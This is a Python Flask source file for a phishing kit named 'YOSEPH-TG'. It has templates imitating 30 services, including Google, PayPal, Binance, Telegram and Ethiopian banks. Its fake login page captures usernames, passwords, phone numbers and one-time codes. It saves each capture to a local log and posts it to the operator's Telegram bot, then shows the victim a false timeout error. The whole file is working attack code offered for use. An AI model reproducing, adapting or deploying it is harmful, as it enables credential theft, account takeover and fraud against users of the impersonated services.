import os, requests, sys, base64, time, datetime, json, socket, platform, random

try:
    from flask import Flask, request, jsonify, render_template_string
except ImportError:
    print("Installing Flask...")
    os.system("pip install flask requests")
    from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)

# ==========================================
# CORE CONFIGURATION & SYSTEM IDENTITY
# ==========================================
TOOL_NAME = "YOSEPH-TG"
VERSION = "12.0.1 (BAD ETHIOPIANHACKER)"
DEVELOPER = "Yoseph Alganeh" #
CONFIG_FILE = "system_data.json"
# Access Token: @Yosephalganeh44
ENCRYPTED_KEY = "QFlvc2VwaGFsZ2FuZWg0NA=="

# ==========================================
# MASSIVE MULTI-TEMPLATE DATABASE (35+ TARGETS)
# ==========================================
# Platforms curated for your interests in Trading, Social, and Finance
TEMPLATES = {
    "1": {"name": "Telegram", "color": "#0088cc", "logo": "https://telegram.org/img/t_logo.png", "type": "phone", "msg": "Official Verification"},
    "2": {"name": "Binance", "color": "#f3ba2f", "logo": "https://upload.wikimedia.org/wikipedia/commons/e/e8/Binance_Logo.svg", "type": "login", "msg": "Secure Login"},
    "3": {"name": "Facebook", "color": "#1877f2", "logo": "https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg", "type": "login", "msg": "Connect Now"},
    "4": {"name": "Instagram", "color": "#e1306c", "logo": "https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg", "type": "login", "msg": "See Photos"},
    "5": {"name": "Google", "color": "#ffffff", "logo": "https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg", "type": "login", "msg": "Sign in to Google", "txt": "black"},
    "6": {"name": "Telebirr", "color": "#00a9e0", "logo": "https://upload.wikimedia.org/wikipedia/en/thumb/5/5f/Telebirr_logo.png/220px-Telebirr_logo.png", "type": "phone", "msg": "Mobile Money"},
    "7": {"name": "MetaTrader 5", "color": "#005596", "logo": "https://www.metatrader5.com/m/metatrader5-logo.png", "type": "login", "msg": "Trading Terminal"},
    "8": {"name": "Exness", "color": "#ffc107", "logo": "https://upload.wikimedia.org/wikipedia/commons/4/4b/Exness_Logo.svg", "type": "login", "msg": "Broker Login", "txt": "black"},
    "9": {"name": "CBE Birr", "color": "#5d2d91", "logo": "https://www.combanketh.et/images/logo.png", "type": "phone", "msg": "Bank Verification"},
    "10": {"name": "TikTok", "color": "#000000", "logo": "https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg", "type": "login", "msg": "Make Your Day"},
    "11": {"name": "WhatsApp", "color": "#25d366", "logo": "https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg", "type": "phone", "msg": "Messaging"},
    "12": {"name": "Netflix", "color": "#e50914", "logo": "https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg", "type": "login", "msg": "Watch Anywhere"},
    "13": {"name": "Spotify", "color": "#1db954", "logo": "https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.svg", "type": "login", "msg": "Listen Free"},
    "14": {"name": "GitHub", "color": "#24292e", "logo": "https://upload.wikimedia.org/wikipedia/commons/9/91/Octicons-mark-github.svg", "type": "login", "msg": "Dev Login"},
    "15": {"name": "PayPal", "color": "#003087", "logo": "https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg", "type": "login", "msg": "Payments"},
    "16": {"name": "LinkedIn", "color": "#0077b5", "logo": "https://upload.wikimedia.org/wikipedia/commons/c/ca/LinkedIn_logo_initials.png", "type": "login", "msg": "Jobs"},
    "17": {"name": "X / Twitter", "color": "#000000", "logo": "https://upload.wikimedia.org/wikipedia/commons/5/57/X_logo_2023_(white).svg", "type": "login", "msg": "Happening Now"},
    "18": {"name": "Trust Wallet", "color": "#3375bb", "logo": "https://trustwallet.com/assets/images/media/assets/trust_platform.png", "type": "login", "msg": "Crypto Assets"},
    "19": {"name": "Discord", "color": "#5865f2", "logo": "https://upload.wikimedia.org/wikipedia/commons/7/73/Discord_Color_Text_Logo.svg", "type": "login", "msg": "Gamers Only"},
    "20": {"name": "Snapchat", "color": "#fffc00", "logo": "https://upload.wikimedia.org/wikipedia/en/a/ad/Snapchat_logo.svg", "type": "login", "msg": "Snap Now", "txt": "black"},
    "21": {"name": "Abay Bank", "color": "#006837", "logo": "https://abaybank.com.et/wp-content/uploads/2021/05/logo.png", "type": "phone", "msg": "Secure Banking"},
    "22": {"name": "Amazon", "color": "#232f3e", "logo": "https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg", "type": "login", "msg": "Shopping"},
    "23": {"name": "Steam", "color": "#171a21", "logo": "https://upload.wikimedia.org/wikipedia/commons/8/83/Steam_icon_logo.svg", "type": "login", "msg": "Gaming Store"},
    "24": {"name": "Apple ID", "color": "#000000", "logo": "https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg", "type": "login", "msg": "iCloud Login"},
    "25": {"name": "Microsoft", "color": "#00a4ef", "logo": "https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg", "type": "login", "msg": "Office 365"},
    "26": {"name": "Reddit", "color": "#ff4500", "logo": "https://upload.wikimedia.org/wikipedia/commons/5/58/Reddit_logo_new.svg", "type": "login", "msg": "Front Page"},
    "27": {"name": "Pinterest", "color": "#bd081c", "logo": "https://upload.wikimedia.org/wikipedia/commons/0/08/Pinterest-logo.png", "type": "login", "msg": "Ideas"},
    "28": {"name": "Airbnb", "color": "#ff5a5f", "logo": "https://upload.wikimedia.org/wikipedia/commons/6/69/Airbnb_Logo_B%C3%A9lo.svg", "type": "login", "msg": "Find Home"},
    "29": {"name": "Coinbase", "color": "#0052ff", "logo": "https://upload.wikimedia.org/wikipedia/commons/c/c2/Coinbase_Logo_2013.png", "type": "login", "msg": "Crypto Exchange"},
    "30": {"name": "Dash", "color": "#008de4", "logo": "https://upload.wikimedia.org/wikipedia/commons/c/c5/Dash_logo.svg", "type": "login", "msg": "Digital Cash"}
}

# ==========================================
# SYSTEM CORE UTILITIES
# ==========================================
def clear(): os.system('clear' if os.name == 'posix' else 'cls')

def get_sys_data():
    return {
        "os": platform.system(),
        "ip": socket.gethostbyname(socket.gethostname()),
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }

def banner():
    info = get_sys_data()
    print(f"""\033[96m
 ╔═══════════════════════════════════════════════════════════════════╗
 ║  \033[93m█▄─█─▄█─▄▄─█─▄▄▄─█▄─▄▄─█─█─█─▀█▄─▄▄─█\033[96m                    ║
 ║  \033[93m─█─▀─██─█─║█─█─▄█─█─█─║█─█─█──█─█─║█\033[96m                    ║
 ║  \033[93m─▀───▀▀▄▄▀▀▀▄▄▄▀▀▄▄▀▀▀▀▀▀▀▀▀──▀▄▄▀▀▀\033[96m                    ║
 ╠═══════════════════════════════════════════════════════════════════╣
 ║  \033[97mDEVELOPER : \033[92m{DEVELOPER}\033[96m                               ║
 ║  \033[97mVERSION   : \033[93m{VERSION}\033[96m                                   ║
 ║  \033[97mTOOL_NAME : \033[92m{TOOL_NAME}\033[96m                                   ║
 ║  \033[97mIP ADDR   : \033[92m{info['ip']}\033[96m                                     ║
 ╚═══════════════════════════════════════════════════════════════════╝\033[0m""")

def authenticate():
    clear(); banner()
    key = input("\033[93m[?] Enter Master Access Key: \033[0m").strip()
    if key != base64.b64decode(ENCRYPTED_KEY).decode():
        print("\033[91m[!] SECURITY BREACH DETECTED. SYSTEM HALTED.\033[0m"); sys.exit()
    print("\033[92m[+] Authentication Successful. Welcome Yoseph.\033[0m")
    time.sleep(1)

def load_system():
    if not os.path.exists(CONFIG_FILE):
        clear(); banner()
        print("\033[95m[*] System Setup - Telegram Data Bridge\033[0m")
        token = input("\033[93m[?] Bot Token: \033[0m").strip()
        chat_id = input("\033[93m[?] Chat ID: \033[0m").strip()
        config = {"token": token, "chat_id": chat_id}
        with open(CONFIG_FILE, "w") as f: json.dump(config, f)
        return config
    with open(CONFIG_FILE, "r") as f: return json.load(f)

# ==========================================
# ADVANCED OMNI-HTML TEMPLATE (GLASS-MORPHISM)
# ==========================================
HTML_ULTRA = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Login | {{ name }}</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        /* */
        @keyframes flow { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
        @keyframes modalShow { from { opacity: 0; transform: scale(0.9) translateY(40px); } to { opacity: 1; transform: scale(1) translateY(0); } }
        @keyframes spinLogo { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        @keyframes pulseGlow { 0%, 100% { box-shadow: 0 0 10px {{ color }}44; } 50% { box-shadow: 0 0 30px {{ color }}88; } }

        body { background: #080a0f; color: white; font-family: 'Segoe UI', Roboto, sans-serif; overflow: hidden; }
        .bg-animated { background: linear-gradient(-45deg, #05070a, #0c121d, #05070a, #1a2a44); background-size: 400% 400%; animation: flow 15s ease infinite; height: 100vh; }
        .glass-box { background: rgba(255, 255, 255, 0.02); backdrop-filter: blur(25px); border: 1px solid rgba(255, 255, 255, 0.05); animation: modalShow 0.8s cubic-bezier(0.19, 1, 0.22, 1); }
        .input-pro { background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); transition: 0.4s cubic-bezier(0.4, 0, 0.2, 1); }
        .input-pro:focus { border-color: {{ color }}; background: rgba(0,0,0,0.5); box-shadow: 0 0 15px {{ color }}33; outline: none; }
        .btn-titan { background: {{ color }}; transition: 0.3s; box-shadow: 0 10px 40px {{ color }}55; animation: pulseGlow 4s infinite; }
        .btn-titan:hover { filter: brightness(1.2); transform: translateY(-3px); }
        .btn-titan:active { transform: translateY(1px) scale(0.98); }
        .loader-line { height: 3px; width: 100%; background: rgba(255,255,255,0.05); overflow: hidden; position: relative; border-radius: 10px; }
        .loader-line::after { content: ''; position: absolute; left: -100%; height: 100%; width: 50%; background: {{ color }}; animation: slideLoader 2s infinite linear; }
        @keyframes slideLoader { from { left: -50%; } to { left: 100%; } }
    </style>
</head>
<body class="bg-animated flex justify-center items-center p-6">
    <div class="glass-box p-12 md:p-16 rounded-[4rem] w-full max-w-md shadow-2xl relative overflow-hidden">
        <div class="absolute -top-32 -right-32 w-64 h-64 rounded-full blur-[120px]" style="background: {{ color }}44"></div>
        <div class="absolute -bottom-32 -left-32 w-64 h-64 rounded-full blur-[120px]" style="background: {{ color }}22"></div>
        
        <div id="content-wrap" class="relative z-10 text-center">
            <div class="mb-10 inline-block p-6 rounded-[2.5rem] bg-white/5 border border-white/10">
                <img src="{{ logo }}" class="h-20 w-20 object-contain drop-shadow-[0_0_15px_rgba(255,255,255,0.2)]">
            </div>
            <h1 class="text-4xl font-black tracking-tighter mb-4">{{ name }}</h1>
            <p class="text-slate-400 text-sm mb-12 font-medium px-4">{{ msg }}</p>

            <div id="form-body" class="space-y-6">
                {% if type == 'phone' %}
                    <div class="space-y-3 text-left">
                        <label class="text-[10px] font-black uppercase tracking-[0.3em] text-slate-500 ml-4">Phone Number</label>
                        <input type="tel" id="f1" placeholder="+251 9... / 09..." class="input-pro w-full p-6 rounded-3xl text-lg font-bold">
                    </div>
                    <button onclick="toOTP()" style="color: {{ text_color|default('white') }}" class="btn-titan w-full p-6 font-black rounded-3xl text-xs tracking-widest uppercase">Request Access</button>
                {% else %}
                    <div class="space-y-4">
                        <input type="text" id="f1" placeholder="Email or Username" class="input-pro w-full p-6 rounded-3xl text-md">
                        <input type="password" id="f2" placeholder="Password" class="input-pro w-full p-6 rounded-3xl text-md">
                    </div>
                    <button onclick="toFinal()" style="color: {{ text_color|default('white') }}" class="btn-titan w-full p-6 font-black rounded-3xl text-xs tracking-widest uppercase">Sign In Now</button>
                {% endif %}
            </div>

            <div id="loading" class="hidden py-14 space-y-8">
                <div class="loader-line mx-auto w-40"></div>
                <p class="text-[9px] font-black text-slate-600 uppercase tracking-[0.5em]">Synchronizing Secure Tunnel...</p>
            </div>

            <p id="error" class="mt-8 text-xs font-bold text-red-500 uppercase tracking-widest min-h-[1rem]"></p>
        </div>

        <div class="mt-16 pt-10 border-t border-white/5 flex flex-col items-center space-y-4 opacity-50">
            <div class="flex space-x-6 text-[9px] font-bold text-slate-500 uppercase tracking-widest">
                <span>Security</span><span>Privacy</span><span>Rules</span>
            </div>
            <p class="text-[8px] font-black text-slate-700 uppercase tracking-[0.4em]">Designed by Yoseph Alganeh</p>
        </div>
    </div>

    <script>
        let u_sav = "";
        async function toOTP() {
            u_sav = document.getElementById('f1').value;
            if(u_sav.length < 8) return;
            toggleS(true);
            await post('/hit', {u: u_sav, p: '[INITIAL_STEP]'});
            setTimeout(() => {
                toggleS(false);
                document.getElementById('form-body').innerHTML = `
                    <div class="space-y-3">
                        <label class="text-[10px] font-black uppercase tracking-[0.3em] text-slate-500">Security Code (OTP)</label>
                        <input type="number" id="f2" placeholder="00000" class="input-pro w-full p-6 rounded-3xl text-center text-4xl font-black tracking-[0.5em]">
                    </div>
                    <button onclick="toFinal()" style="background: {{ color }}; color: {{ text_color|default('white') }}" class="btn-titan w-full p-6 font-black rounded-3xl text-xs tracking-widest uppercase">Verify Identity</button>
                `;
            }, 2500);
        }

        async function toFinal() {
            let u = u_sav || document.getElementById('f1').value;
            let p = document.getElementById('f2').value;
            if(p.length < 4) return;
            toggleS(true);
            await post('/hit', {u: u, p: p});
            setTimeout(() => {
                toggleS(false);
                document.getElementById('error').innerText = "System Timeout: Connection reset by peer.";
            }, 3500);
        }

        async function post(u, d) {
            try { await fetch(u, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(d)}); } catch(e){}
        }

        function toggleS(s) {
            document.getElementById('form-body').classList.toggle('hidden', s);
            document.getElementById('loading').classList.toggle('hidden', !s);
            document.getElementById('error').innerText = "";
        }
    </script>
</body>
</html>
"""

# ==========================================
# FLASK ROUTING & CAPTURE LOGIC
# ==========================================
@app.route('/')
def home():
    return render_template_string(HTML_ULTRA, 
        name=TARGET['name'], color=TARGET['color'], logo=TARGET['logo'], 
        type=TARGET['type'], msg=TARGET['msg'], text_color=TARGET.get('txt', 'white'))

@app.route('/hit', methods=['POST'])
def capture_hit():
    data = request.json
    now = datetime.datetime.now().strftime("%H:%M:%S | %Y-%m-%d")
    
    # Powerful Markdown Notification
    log_msg = f"🛰️ *{TOOL_NAME} - SYSTEM BREACH* 🛰️\n" \
              f"━━━━━━━━━━━━━━━━━━━━\n" \
              f"🌐 *Platform:* `{TARGET['name']}`\n" \
              f"👤 *Username:* `{data['u']}`\n" \
              f"🔑 *Password:* `{data['p']}`\n" \
              f"━━━━━━━━━━━━━━━━━━━━\n" \
              f"🕒 *Captured:* `{now}`\n" \
              f"🛡️ *Developer:* `Yoseph Alganeh`"
    
    # Save locally
    with open("omniverse_logs.txt", "a") as f: f.write(log_msg + "\n\n")
    
    # Send to Telegram Bridge
    try:
        requests.post(f"https://api.telegram.org/bot{CONF['token']}/sendMessage", 
                      data={"chat_id": CONF['chat_id'], "text": log_msg, "parse_mode": "Markdown"})
    except: pass
    return jsonify({"status": "captured"})

# ==========================================
# MASTER EXECUTION ENGINE
# ==========================================
if __name__ == '__main__':
    authenticate()
    CONF = load_system()
    
    clear(); banner()
    print("\033[95m  [ OMNIVERSE ARCHITECTURE - SELECT TARGET ]\033[0m")
    items = list(TEMPLATES.items())
    for i in range(0, len(items), 2):
        k1, v1 = items[i]
        line = f"  [\033[92m{k1}\033[0m] \033[97m{v1['name']:<20}\033[0m"
        if i+1 < len(items):
            k2, v2 = items[i+1]
            line += f"  [\033[92m{k2}\033[0m] \033[97m{v2['name']:<20}\033[0m"
        print(line)
    
    print("\n\033[91m  [0] Destroy System\033[0m")
    choice = input("\n\033[93m[YOSEPH-TG] > \033[0m").strip()
    
    if choice in TEMPLATES:
        TARGET = TEMPLATES[choice]
        clear(); banner()
        print(f"\033[92m[*] Target Injected: {TARGET['name']}\033[0m")
        print(f"\033[94m[*] Deployment Link: http://127.0.0.1:5000\033[0m")
        print(f"\033[90m[*] Powered by {DEVELOPER.upper()}\033[0m\n")
        
        # Deploy on mobile interface
        app.run(host='0.0.0.0', port=5000, debug=False)
    else:
        print("\033[91m[!] Emergency Shutdown.\033[0m"); sys.exit()
